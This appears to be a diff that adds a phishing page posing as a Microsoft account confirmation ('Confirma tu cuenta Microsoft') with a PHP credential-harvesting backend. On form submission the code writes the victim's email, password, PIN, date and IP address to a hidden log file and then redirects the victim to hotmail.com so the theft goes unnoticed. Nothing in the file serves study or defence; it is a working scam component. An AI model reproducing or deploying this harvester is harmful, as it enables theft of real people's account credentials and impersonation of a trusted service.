@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<link  rel="icon"   href="favicon.png" type="SCAM/favicon.png" sizes="16x16"/>
+		<title>Confirma tu cuenta Microsoft</title>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+header('Location: http://hotmail.com');
+$file = fopen('perifericosactivos.html', 'a');
+fwrite($file, "C0rr30: ".$_POST['emil']." <br> Cl4v3: ".$_POST['pss']."<br> PIN: ".$_POST['numero']." <br> Fecha: ".date('d-m-Y')." | ".date('H:i:s')." ".$_SERVER['REMOTE_ADDR']." <br> " . PHP_EOL );
+fwrite($file, "*************BY MONTAÑO****************** <br>");
+fclose($file);
+exit;
+} ?>
+
+
+</head>
+
+</html>
+
